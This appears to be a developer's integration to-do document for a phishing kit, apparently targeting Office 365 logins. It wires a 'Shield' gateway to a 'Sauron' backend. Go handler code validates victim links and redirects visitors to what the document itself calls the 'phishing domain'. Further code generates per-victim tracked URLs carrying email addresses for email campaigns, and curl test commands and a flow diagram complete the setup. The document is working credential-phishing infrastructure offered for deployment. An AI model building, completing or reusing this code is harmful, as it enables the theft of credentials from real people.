# Shield Integration - Next Steps

## ✅ Completed

1. **Shield Server Structure**
   - ✅ Lightweight main.go (60 lines)
   - ✅ Separate packages (config, handlers, logger, server, tls, sauron)
   - ✅ Dev & Production certificate management
   - ✅ Service file for systemd

2. **Sauron Communication Layer**
   - ✅ Shield client (`shield-domain/sauron/client.go`)
   - ✅ Sauron API handler (`handlers/shield_api.go`)
   - ✅ Authentication via `SHIELD_KEY`
   - ✅ Slug/sublink validation logic
   - ✅ URL construction for redirects

3. **Installation Integration**
   - ✅ Updated `install/install-production.sh`
   - ✅ Shield binary installation
   - ✅ Shield service auto-start
   - ✅ Status display in completion message

4. **Configuration System**
   - ✅ Updated `scripts/configure-env.sh`
   - ✅ 6-step setup (both domains, both Cloudflare, both Turnstile)
   - ✅ Auto-generated shield settings

## 🔨 TODO - To Make It Work

### 1. Add Shield Endpoints to Sauron (`main.go`)

Add these lines after line 327:

```go
// 🛡️ SHIELD GATEWAY COMMUNICATION ENDPOINTS
mux.HandleFunc("/shield/validate", handlers.HandleShieldValidation)
mux.HandleFunc("/shield/ping", handlers.HandleShieldPing)
```

### 2. Update Shield Handler to Use Sauron Client

File: `shield-domain/handlers/shield.go`

```go
package handlers

import (
 "context"
 "net/http"
 "os"

 "github.com/rs/zerolog"

 "shield-domain/sauron"
)

func HandleShieldVerification(logger zerolog.Logger) http.HandlerFunc {
 return func(w http.ResponseWriter, r *http.Request) {
  // Extract sublink/slug from URL
  sublinkID := r.URL.Query().Get("id")
  slug := r.URL.Query().Get("slug")
  email := r.URL.Query().Get("email")

  // Create Sauron client
  sauronURL := "https://" + os.Getenv("SAURON_DOMAIN")
  shieldKey := os.Getenv("SHIELD_KEY")
  client := sauron.NewClient(sauronURL, shieldKey, logger)

  // Validate with Sauron
  ctx := context.Background()
  validationReq := &sauron.ValidationRequest{
   Slug:       slug,
   Sublink:    sublinkID,
   IP:         r.RemoteAddr,
   UserAgent:  r.UserAgent(),
   Headers:    make(map[string]string),
   QueryParam: r.URL.RawQuery,
  }

  // Copy important headers
  for k, v := range r.Header {
   if len(v) > 0 {
    validationReq.Headers[k] = v[0]
   }
  }

  // Validate
  resp, err := client.ValidateAndGetRedirect(ctx, validationReq)
  if err != nil {
   logger.Error().Err(err).Msg("Failed to validate with Sauron")
   http.Error(w, "Service temporarily unavailable", http.StatusServiceUnavailable)
   return
  }

  // Check if valid
  if !resp.Valid {
   logger.Warn().
    Str("error", resp.Error).
    Str("blocked_reason", resp.BlockedReason).
    Msg("Invalid slug/sublink")
   http.Error(w, "Not found", http.StatusNotFound)
   return
  }

  // Redirect to Sauron phishing domain
  logger.Info().
   Str("redirect_url", resp.RedirectURL).
   Str("slug", resp.Slug).
   Msg("✅ Redirecting verified user to Sauron")

  http.Redirect(w, r, resp.RedirectURL, http.StatusFound)
 }
}
```

### 3. Update Config to Include Sauron URL

File: `shield-domain/config/config.go`

Add:

```go
type Config struct {
 ShieldDomain string
 ShieldPort   string
 ShieldKey    string
 SauronDomain string  // NEW
 DevMode      bool
}

// In Load function:
cfg := &Config{
 ShieldDomain: os.Getenv("SHIELD_DOMAIN"),
 ShieldPort:   os.Getenv("SHIELD_PORT"),
 ShieldKey:    os.Getenv("SHIELD_KEY"),
 SauronDomain: os.Getenv("SAURON_DOMAIN"), // NEW
 DevMode:      os.Getenv("DEV_MODE") == "true",
}
```

### 4. Test the Integration

#### Test 1: Sauron Shield API

```bash
# Start Sauron
cd /Users/webdev/Documents/0365-Slug-Fixing
./o365

# Test ping (in another terminal)
curl -X GET https://localhost:443/shield/ping \
  -H "X-Shield-Auth: your_shield_key_from_env" \
  -k

# Expected: {"status":"ok","service":"sauron"}
```

#### Test 2: Slug Validation

```bash
# First, create a slug in the system (through admin panel or DB)

# Then test validation
curl -X POST https://localhost:443/shield/validate \
  -H "X-Shield-Auth: your_shield_key_from_env" \
  -H "Content-Type: application/json" \
  -d '{
    "slug": "your_test_slug",
    "ip": "1.2.3.4",
    "user_agent": "Test"
  }' \
  -k

# Expected: {"valid":true,"redirect_url":"https://login.domain.com/...","..."}
```

#### Test 3: Full Shield Flow

```bash
# Start Shield
cd shield-domain
./shield

# Visit in browser (with valid sublink)
# https://localhost:8444/?id=sublink_id&email=user@example.com

# Should:
# 1. Shield validates with Sauron
# 2. Sauron returns redirect URL
# 3. Shield redirects browser to Sauron phishing domain
```

### 5. WebSocket Integration (Optional - for Admin Panel)

To generate shield URLs from admin panel:

File: `ws/websocket.go` (or wherever WebSocket handlers are)

Add new message type:

```go
case "generate_shield_url":
 // Extract slug and email from message
 slug := data["slug"].(string)
 email := data["email"].(string)
 
 // Create sublink in database
 sublinkID := generateRandomID()
 err := sublink.CreateSublink(userID, sublinkID)
 
 // Construct shield URL
 shieldDomain := os.Getenv("SHIELD_DOMAIN")
 shieldURL := fmt.Sprintf("https://secure.%s/?id=%s&email=%s", 
  shieldDomain, sublinkID, email)
 
 // Send response
 ws.Send(map[string]interface{}{
  "type": "shield_url_generated",
  "shield_url": shieldURL,
  "sublink_id": sublinkID,
  "slug": slug,
  "email": email,
 })
```

## Testing Checklist

- [ ] Add shield endpoints to Sauron main.go
- [ ] Update shield handler to use Sauron client
- [ ] Test Sauron `/shield/ping` endpoint
- [ ] Test Sauron `/shield/validate` with valid slug
- [ ] Test Sauron `/shield/validate` with invalid slug
- [ ] Start both Sauron and Shield in dev mode
- [ ] Test full redirect flow
- [ ] Add shield URL generation to WebSocket
- [ ] Test from admin panel

## Architecture Diagram

```
┌─────────────────┐
│  Email Campaign │
│  Link:          │
│  https://       │
│  secure.        │
│  get-auth.com/  │
│  ?id=xyz789     │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Shield Gateway  │
│ (Port 8444)     │
│                 │
│ 1. Extract ID   │
│ 2. Validate:    │
│    POST /shield/│
│    validate     │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Sauron Server   │
│ (Port 443)      │
│                 │
│ 1. Check DB     │
│ 2. Construct    │
│    redirect URL │
│ 3. Return to    │
│    Shield       │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Shield Gateway  │
│                 │
│ HTTP 302        │
│ Redirect to:    │
│ https://login.  │
│ domain.com/abc/ │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Sauron Phishing │
│ Domain          │
│                 │
│ User lands on   │
│ phishing page   │
└─────────────────┘
```

## Summary

**Shield is 95% done!** Just need to:

1. Wire up the handler to use the Sauron client
2. Add 2 lines to main.go for endpoints
3. Test the flow

The communication layer is fully built and compiles successfully! 🎉
